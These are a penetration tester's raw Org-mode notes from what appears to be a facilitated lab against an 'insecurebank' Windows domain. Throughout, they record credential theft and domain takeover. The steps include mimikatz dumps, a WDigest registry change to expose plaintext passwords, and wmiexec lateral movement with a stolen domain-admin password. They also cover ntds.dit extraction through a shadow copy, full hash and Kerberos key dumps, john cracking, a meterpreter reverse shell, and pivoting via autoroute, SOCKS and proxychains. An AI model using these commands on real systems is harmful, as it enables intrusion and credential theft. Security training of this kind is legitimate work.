0;999      Negotiate  insecurebank    INTRANET$      96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
#+END_EXAMPLE

+msv credentials
#+BEGIN_EXAMPLE
meterpreter > mimikatz_command -f sekurlsa::msv
"0;88329138","Negotiate","Administrator","INTRANET","n.a. (msv1_0 KO)"
"0;1802806","Kerberos","bob","insecurebank","n.a. (msv1_0 KO)"
"0;1584398","Negotiate","DWM-2","Window Manager","n.a. (msv1_0 KO)"
"0;51773","Negotiate","DWM-1","Window Manager","n.a. (msv1_0 KO)"
"0;996","Negotiate","INTRANET$","insecurebank","n.a. (msv1_0 KO)"
"0;997","Negotiate","LOCAL SERVICE","NT AUTHORITY","n.a. (msv1_0 KO)"
"0;30430","NTLM","","","n.a. (msv1_0 KO)"
"0;999","Negotiate","INTRANET$","insecurebank","n.a. (msv1_0 KO)"
#+END_EXAMPLE

+ Note: bob seems to be a domain admin 
  * we can find this with running ~net user bob /domain~
+ Note: Domain admins should not be allowed to log in to workstations to reduce attack surface


*** getting the address of the domain controller

C:\users\bob\desktop>nltest /DCLIST:insecurebank
nltest /DCLIST:insecurebank
Get list of DCs in domain 'insecurebank' from '\\DC1'.
You don't have access to DsBind to insecurebank (\\DC1) (Trying NetServerEnum).
List of DCs in Domain insecurebank
    \\DC1 (PDC)
The command completed successfully

Proxy:
meterpreter > getproxy
Auto-detect     : No
Auto config URL : 
Proxy URL       : http://10.59.6.11:80
Proxy Bypass    : 

*** Changing the WDigest settings so we can see plaintext credentials

+ Attempted to change the wdigest setting on 
https://www.trustedsec.com/2015/04/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/

meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -d 1 
Successfully set UseLogonCredential of REG_SZ

NOTE: now we should need to get bob to reconnect to be able to grab credentials

+ this was done by the facilitator, but still couldn't see the credentials

Windows 2012 R2 x64 (build 9600) en_US 

** Defense evasion - disable antivirus / antimalware

kerberos mimikatz 
https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos

**** Was told by the facilitator that this could be caused by using an old version of mimikatz
Mimikatz included in meterpreter is version *1.0*, there is version *2.x* available on github

** Obtained Bob's password
	wdigest :	
	 * Username : bob
	 * Domain   : insecurebank
	 * Password : Very_SafeDAPW!

Path: 
+ logged in via meterpreter
+ Uploaded *newer version of mimikatz* (binary from github) 
  * The one built into meterpreter was 1.0 and couldn't get digest passwords
+ executed new mimikatz binary
+ sekurlsa::logonPasswords
so I executed mimikatz, then executed

** Bob's machine - 21
obtained openvpn config

ping -a 10.59.4.17

*** NOTE - deliver payload through wmi / https://www.trustedsec.com/2015/06/no_psexec_needed/

*** NOTE - sysinternals tool suite - for example autoruns

** Pivoting to the DC

let's try to bob's machine
../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.21

DC: ../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.21
/Note: we need to escape the !/

Then we're in bob's

*** Edward's ssh private key
DEK-Info: AES-128-CBC,F27A1EC4F598875B32378B6E6DFF3795

DC - created a volume shadow copy:
C:\windows\ntds>vssadmin create shadow /for=c:

Successfully created shadow copy for 'c:\'
    Shadow Copy ID: {ba02786c-cb1f-4f44-8644-22975c7046bf}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
then downloaded ntds.dit via wmiexec and removed the file
the same repeated for SYSTEM hive

Secrets dump from *ntds.dit*
root@kali:~/Downloads/11-dc# impacket-secretsdump -system system -ntds ntds.dit LOCAL

*** ntds dump
*] Reading and decrypting hashes from ntds.dit 
#+BEGIN_EXAMPLE
Administrator:500:aad3b435b51404eeaad3b435b51404ee:16df1e2f1ee258ed53b3a514abd4978a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1004:aad3b435b51404eeaad3b435b51404ee:2ae949c82d64da279a76c069f4b86584:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff3b0abe3052fd633f0eea8e0445a4b6:::
alice:1107:aad3b435b51404eeaad3b435b51404ee:7ebf1439bd9142b22fa93ecc5633e601:::
bob:1108:aad3b435b51404eeaad3b435b51404ee:d3ea06beca64d42948a2cb28f9583eb6:::
charles:1109:aad3b435b51404eeaad3b435b51404ee:2661aedbddb32a6031668e453ca05818:::
dave:1110:aad3b435b51404eeaad3b435b51404ee:4f06556cd97b91ad333ee4c42c6fb83d:::
edward:1111:aad3b435b51404eeaad3b435b51404ee:bf5d30509a3e71c406f5d52e42c8742e:::
fred:1112:aad3b435b51404eeaad3b435b51404ee:665ef2db6eed99be5363b5dce9f08437:::
INTRANET$:1113:aad3b435b51404eeaad3b435b51404ee:d3acd13752128d7e469600ab4889d383:::
DEV_SERVER$:1114:aad3b435b51404eeaad3b435b51404ee:b4378efa9bcf1379f3bb50f8aba19d12:::
DAVE$:1115:aad3b435b51404eeaad3b435b51404ee:9527e1014913a052a5a58aaf117980cc:::
BOB$:1116:aad3b435b51404eeaad3b435b51404ee:cc7765b13ad36c208cc879f91620353d:::
EDWARD$:1117:aad3b435b51404eeaad3b435b51404ee:ce897cffe8472dc4dc24d94a201d4f78:::
FRED$:1118:aad3b435b51404eeaad3b435b51404ee:0a591e1b55d466daaf98b4605408d8fe:::
CHARLES$:1119:aad3b435b51404eeaad3b435b51404ee:7ec57532c27acc0afea99942e8080368:::
ALICE$:1120:aad3b435b51404eeaad3b435b51404ee:77323c8c3b906ad620e1b6cd34217e76:::
[*] Kerberos keys from ntds.dit 
DC1$:aes256-cts-hmac-sha1-96:7128c66bdcabfdd0a42e6c9fc2d1f1ce920726e23edd23beecd4b69464a6a794
DC1$:aes128-cts-hmac-sha1-96:5f92e18fa8e52fc90cc4aef0dc29636c
DC1$:des-cbc-md5:d66e64204615b602
DC1$:rc4_hmac:2ae949c82d64da279a76c069f4b86584
krbtgt:aes256-cts-hmac-sha1-96:9a94d9cf1b3d0652be7d6796a819304b3fee347034c7a303b1461118f10719c3
krbtgt:aes128-cts-hmac-sha1-96:cdb6d28156d3e69e7e8ced6b79cb1394
krbtgt:des-cbc-md5:456da8921675a41a
krbtgt:rc4_hmac:ff3b0abe3052fd633f0eea8e0445a4b6
alice:aes256-cts-hmac-sha1-96:784e50ed785d355ca054e0b0da73fff468d044597aba0f95786be29f28e5b2f2
alice:aes128-cts-hmac-sha1-96:bd33aa040b08471caa4f7d06bd0c9dfa
alice:des-cbc-md5:7cc4f7f7d0c8ef4f
alice:rc4_hmac:7ebf1439bd9142b22fa93ecc5633e601
bob:aes256-cts-hmac-sha1-96:507715e8c611f613fa770689628b5daf88f6736ff55c92421b0bababae8ceb21
bob:aes128-cts-hmac-sha1-96:77959e23f2a8a4fb932276cefcf9ddcd
bob:des-cbc-md5:5dfe29b59876320e
bob:rc4_hmac:d3ea06beca64d42948a2cb28f9583eb6
charles:aes256-cts-hmac-sha1-96:ff7547b02e776529a122551d064da3bc1502451c7b228680c9282db26013c5d9
charles:aes128-cts-hmac-sha1-96:023faa2fd6ca84ad847454dbfcd7d34c
charles:des-cbc-md5:ae02020775a2f14c
charles:rc4_hmac:2661aedbddb32a6031668e453ca05818
dave:aes256-cts-hmac-sha1-96:60b4626e2dadcac21e79df2c2e9cf34e1260d84276f95e28412a51336fcca25f
dave:aes128-cts-hmac-sha1-96:7c7e69090305c950e7f8c64eec589d12
dave:des-cbc-md5:5dc857312f75706b
dave:rc4_hmac:4f06556cd97b91ad333ee4c42c6fb83d
edward:aes256-cts-hmac-sha1-96:a6d7fbfb7bd14b65cd51dea23e35c0190f95a1eef8dd4c13e05e6fe4ddc00ba1
edward:aes128-cts-hmac-sha1-96:54bd4e459d5491defaadb0f9ad2f151c
edward:des-cbc-md5:205d4fcdb0323db6
edward:rc4_hmac:bf5d30509a3e71c406f5d52e42c8742e
fred:aes256-cts-hmac-sha1-96:9bac02b59b9edad03b757e0573e5086bc26d13a3c7d109409b18328fe4d1a4fb
fred:aes128-cts-hmac-sha1-96:92bce228d5fb8b292dd44d9a3b06335e
fred:des-cbc-md5:2cb329989ba194da
fred:rc4_hmac:665ef2db6eed99be5363b5dce9f08437
INTRANET$:aes256-cts-hmac-sha1-96:862d06a74857f774898577fb8714c5ca47eef76efce15be0d736d40e2de8e51a
INTRANET$:aes128-cts-hmac-sha1-96:e73b94eb022e2bed6410a07e194c8589
INTRANET$:des-cbc-md5:fbdf467cc2fb204f
INTRANET$:rc4_hmac:d3acd13752128d7e469600ab4889d383
DEV_SERVER$:aes256-cts-hmac-sha1-96:ab1cd5094f32e8d9970cb6ab30675a9c5e945f9565e01a2e8c2c015cd0eda098
DEV_SERVER$:aes128-cts-hmac-sha1-96:387a65c76fa0d808e9b46636ec7c347b
DEV_SERVER$:des-cbc-md5:044f9ddf6213d694
DEV_SERVER$:rc4_hmac:b4378efa9bcf1379f3bb50f8aba19d12
DAVE$:aes256-cts-hmac-sha1-96:58e99ed6c08f071c31b98d0a3cdad362f9f700b94adf6491b6c998ece83457ac
DAVE$:aes128-cts-hmac-sha1-96:e78c33a63c2aa722368394a3c8e3e125
DAVE$:des-cbc-md5:2a9dd54989fdceb5
DAVE$:rc4_hmac:9527e1014913a052a5a58aaf117980cc
BOB$:aes256-cts-hmac-sha1-96:e5feb0bb1626a69461bdfc27b7fa20f3f47aca5cdadd2abb2fba0617e17eabb7
BOB$:aes128-cts-hmac-sha1-96:87a92097fa2c30e54bc0eb6b9a3bae6f
BOB$:des-cbc-md5:ceb38658704673e9
BOB$:rc4_hmac:cc7765b13ad36c208cc879f91620353d
EDWARD$:aes256-cts-hmac-sha1-96:04f0e74de79397d72e78519347f59a567347c5a8d2d645bb3461cb7b2758e926
EDWARD$:aes128-cts-hmac-sha1-96:fd581047657c7fe1e2073a710e91d14f
EDWARD$:des-cbc-md5:04f1c807c1abec31
EDWARD$:rc4_hmac:ce897cffe8472dc4dc24d94a201d4f78
FRED$:aes256-cts-hmac-sha1-96:03a7c7b5212657362973b899f9ad8e4b0ba64e34126761d3b25692aafbabb66d
FRED$:aes128-cts-hmac-sha1-96:3d7e52edfda209623c39c7f822ee7707
FRED$:des-cbc-md5:a257310885371358
FRED$:rc4_hmac:0a591e1b55d466daaf98b4605408d8fe
CHARLES$:aes256-cts-hmac-sha1-96:142c00422911817ac8a901d307d1a605b3af7f6d09df94ac7c9160387001c3ac
CHARLES$:aes128-cts-hmac-sha1-96:09eae7edf31424013396112cd044d84d
CHARLES$:des-cbc-md5:58f4f2c70191ae29
CHARLES$:rc4_hmac:7ec57532c27acc0afea99942e8080368
ALICE$:aes256-cts-hmac-sha1-96:95c62f827b475e1dbdae3ccb865045e34b389a5b1f489c8f10a6f20d42e07fed
ALICE$:aes128-cts-hmac-sha1-96:83cf03a0ee49aacd692f38b3e3835cdc
ALICE$:des-cbc-md5:0eb3b51a7062518c
ALICE$:rc4_hmac:77323c8c3b906ad620e1b6cd34217e76
#+END_EXAMPLE

*** going to the machine with 3 NICs

10.59.4.17
~./wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~

Uploaded meterpreter as c:\see.exe (reverse shell x64 -> 443)

Note - I needed to migrate to x64 

I'm not sure how to execute nmap over this machine, 

windows ping sweep:
for /l %i in (1,1,254) do @ping -n 1 -w 100 10.59.3.%i >> ping.txt

did also ~arp -a~

*** arp results on 10.59.4.17

Interface: 10.59.5.13 --- 0xf
  Internet Address      Physical Address      Type
  10.59.5.1             00-24-81-4a-e1-ec     dynamic   
  10.59.5.10            00-24-81-76-5a-06     dynamic      
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static       

Interface: 10.59.3.10 --- 0x10
  Internet Address      Physical Address      Type
  10.59.3.1             00-24-81-6f-a3-f6     dynamic   
  10.59.3.11            00-24-81-38-95-08     dynamic   
  10.59.3.12            00-24-81-0f-92-49     dynamic   
  10.59.3.13            00-24-81-7f-c2-03     dynamic   
  10.59.3.14            00-24-81-59-46-ac     dynamic    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    

10.59.3.10 -> ADMIN (.4.17)
10.59.5.13 -> ADMIN (.4.17)

*** How do we tunnel the traffic over meterpreter session?
https://www.blackhillsinfosec.com/use-nmap-meterpreter/

added a route over meterpreter > run autoroute -s 10.59.3.0 -n 255.0.0.0

hashdump on .4.17 in meterpreter: ~run hashdump~

#+BEGIN_EXAMPLE
Administrator:500:aad3b435b51404eeaad3b435b51404ee:edc9be02e6139d22367f1c72d6486113:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1004:aad3b435b51404eeaad3b435b51404ee:d3ea06beca64d42948a2cb28f9583eb6:::
charles:1005:aad3b435b51404eeaad3b435b51404ee:160d3cc9b153b5eb9647c768432adcf7:::
#+END_EXAMPLE

Charles password decrypts to Jasper01

*** john output
root@kali:~/Downloads/17-admin# john -w=/usr/share/wordlists/rockyou.txt --format=nt hashdump.txt 
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Guest)
*Jasper01*         (charles)

*** scan of the .3 subnet
+ added a route with autoroute
+ backgrounded my session
+ loaded a built in port scanner and used against the newly routed subnet
	#+BEGIN_SRC
	use auxiliary/scanner/portscan/tcp
	set RHOSTS 10.59.3.0-255
	set PORTS 22,139,445
	set THREADS 8
	run
	#+END_SRC
+ got the results:
  #+BEGIN_EXAMPLE
  [+] 10.59.3.10:           - 10.59.3.10:139 - TCP OPEN
  [+] 10.59.3.14:           - 10.59.3.14:22 - TCP OPEN
  [+] 10.59.3.10:           - 10.59.3.10:445 - TCP OPEN
  [+] 10.59.3.11:           - 10.59.3.11:22 - TCP OPEN
  [+] 10.59.3.13:           - 10.59.3.13:22 - TCP OPEN
  #+END_EXAMPLE


Next step - set up SOCKS proxy and proxychains

**** NOTE! ssh server could be 7722 - doesn't show up in scan of the lower 1024 ports

*** 18:05 reestablishing conection to .17
+ with ~../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~
+ uploaded a new reverse shell - reverse-100-443
+ re-adding routes to .3 and .5 subnet:
  * run autoroute -s 10.59.3.0 -n 255.0.0.0
  * run autoroute -s 10.59.5.0 -n 255.0.0.0

#+BEGIN_EXAMPLE
msf5 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.59.5.0-255
RHOSTS => 10.59.5.0-255
msf5 auxiliary(scanner/portscan/tcp) > set RPORTS 22,139,445
RPORTS => 22,139,445
msf5 auxiliary(scanner/portscan/tcp) > set THREADS 8
THREADS => 8
msf5 auxiliary(scanner/portscan/tcp) > run
#+END_EXAMPLE

*** looks like time to set up a socks proxy

https://www.offensive-security.com/metasploit-unleashed/proxytunnels/

+ Load the socks4a module
  #+BEGIN_SRC
  use auxiliary/server/socks4a
  set SRVHOST 
  set SRVPORT 8080
  run
  #+END_SRC

+ Now let's configure proxychains to the port we defined
  * edit ~/etc/proxychains.conf~ - changed last line to:
  * ~socks4 	127.0.0.1 8080~
+ now we should be able to run external tools through the tunnel:
  * ~proxychains nmap -sV 10.59.3.14~
+ Alternative way to set up route:
  #+BEGIN_SRC
  use multi/manage/autoroute
  set SESSION 1
  run
  #+END_SRC
  * this added routes to .3.0 and .5.0
+ now we can use the proxy:
  * proxychains ssh -i prod.key edward@10.59.3.14

**** edwards's pass phrase? 
Aiwaib6s

*** How to verify ssh pass phrase for a private key:
+ ssh-add prod.key 

**** output from ssh -v (verbose) attempt to connect to .3.13
#+BEGIN_EXAMPLE
root@kali:~/Downloads/24-edward# proxychains ssh -v -i prod.key edward@10.59.3.13
ProxyChains-3.1 (http://proxychains.sf.net)
OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1c  28 May 2019
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to 10.59.3.13 [10.59.3.13] port 22.
|S-chain|-<>-127.0.0.1:1080-<><>-10.59.3.13:22-<><>-OK
debug1: Connection established.
debug1: identity file prod.key type -1
debug1: identity file prod.key-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
debug1: match: OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
debug1: Authenticating to 10.59.3.13:22 as 'edward'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:pLR+rhlSzT0Fb/k08g5+augz/h2piFxJI7EOuwhPHS0
debug1: Host '10.59.3.13' is known and matches the ECDSA host key.
debug1: Found key in /root/.ssh/known_hosts:4
debug1: rekey after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey after 134217728 blocks
debug1: Will attempt key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
debug1: Will attempt key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
debug1: Will attempt key: prod.key  explicit
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<rsa-sha2-256,rsa-sha2-512>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: password
debug1: Next authentication method: password
edward@10.59.3.13's password: 
#+END_EXAMPLE

**** ssh output from .3.11 is the only one that asks for a passphrase
#+BEGIN_EXAMPLE
root@kali:~/Downloads/24-edward# proxychains ssh -v -i prod.key edward@10.59.3.11
ProxyChains-3.1 (http://proxychains.sf.net)
OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1c  28 May 2019
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug1: Connecting to 10.59.3.11 [10.59.3.11] port 22.
|S-chain|-<>-127.0.0.1:1080-<><>-10.59.3.11:22-<><>-OK
debug1: Connection established.
debug1: identity file prod.key type -1
debug1: identity file prod.key-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.7p1 Debian-5+deb8u4
debug1: match: OpenSSH_6.7p1 Debian-5+deb8u4 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 10.59.3.11:22 as 'edward'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:S+pRkyHMlrreSawjPmyZphkzKDxG9yBCY54Zhrh4fZE
debug1: Host '10.59.3.11' is known and matches the ECDSA host key.
debug1: Found key in /root/.ssh/known_hosts:3
debug1: rekey after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey after 134217728 blocks
debug1: Will attempt key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
debug1: Will attempt key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
debug1: Will attempt key: prod.key  explicit
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Offering public key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
debug1: Authentications that can continue: publickey,password
debug1: Offering public key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
debug1: Authentications that can continue: publickey,password
debug1: Trying private key: prod.key
Enter passphrase for key 'prod.key': 
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: password
edward@10.59.3.11's password: 
#+END_EXAMPLE
